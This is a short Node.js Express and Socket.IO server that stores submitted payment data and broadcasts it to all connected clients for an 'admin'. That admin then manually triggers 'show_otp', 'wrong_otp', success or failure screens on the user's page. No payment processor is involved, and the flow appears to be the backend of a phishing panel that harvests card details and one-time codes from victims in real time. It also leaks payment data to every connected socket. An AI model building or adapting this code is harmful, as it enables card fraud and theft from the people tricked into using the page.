import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
const httpServer = createServer(app);
const io = new Server(httpServer, {
  cors: {
    origin: "http://localhost:5173",
    methods: ["GET", "POST"]
  }
});

// Serve static files
app.use(express.static('dist'));

// Handle SPA routing
app.get('*', (req, res) => {
  res.sendFile(join(__dirname, 'dist', 'index.html'));
});

// Store active payment sessions
const activeSessions = new Map();

io.on('connection', (socket) => {
  console.log('Client connected:', socket.id);

  // Handle payment submission from user
  socket.on('payment_submitted', (paymentData) => {
    const sessionId = Math.random().toString(36).substring(7);
    activeSessions.set(sessionId, {
      paymentData,
      status: 'pending',
      socket: socket.id
    });
    
    // Notify admin of new payment
    io.emit('new_payment', { sessionId, paymentData });
  });

  // Handle admin actions
  socket.on('admin_action', ({ action, sessionId }) => {
    const session = activeSessions.get(sessionId);
    if (!session) return;

    switch (action) {
      case 'show_otp':
        io.to(session.socket).emit('show_otp');
        break;
      case 'wrong_otp':
        io.to(session.socket).emit('wrong_otp');
        break;
      case 'success':
        io.to(session.socket).emit('payment_success', session.paymentData);
        activeSessions.delete(sessionId);
        break;
      case 'fail':
        io.to(session.socket).emit('payment_failed');
        activeSessions.delete(sessionId);
        break;
    }
  });

  socket.on('disconnect', () => {
    console.log('Client disconnected:', socket.id);
  });
});

const PORT = 3000;
httpServer.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});